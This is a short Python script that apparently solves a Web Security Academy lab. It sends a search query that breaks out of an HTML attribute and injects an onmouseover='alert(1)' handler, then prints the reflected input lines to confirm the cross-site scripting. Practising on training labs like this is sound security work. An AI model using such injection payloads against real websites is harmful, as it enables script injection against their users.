import requests

s = requests.Session()
odin_id = 'lamlon'
site = '0a8500a10374200f800d030100f8004a.web-security-academy.net'
# search_term = odin_id
search_term = f'''{odin_id}" onmouseover="alert(1)'''
search_url = f'https://{site}/?search={search_term}'
resp = s.get(search_url)
for line in resp.text.split('\n'):
    if 'input' in line:
        print(line)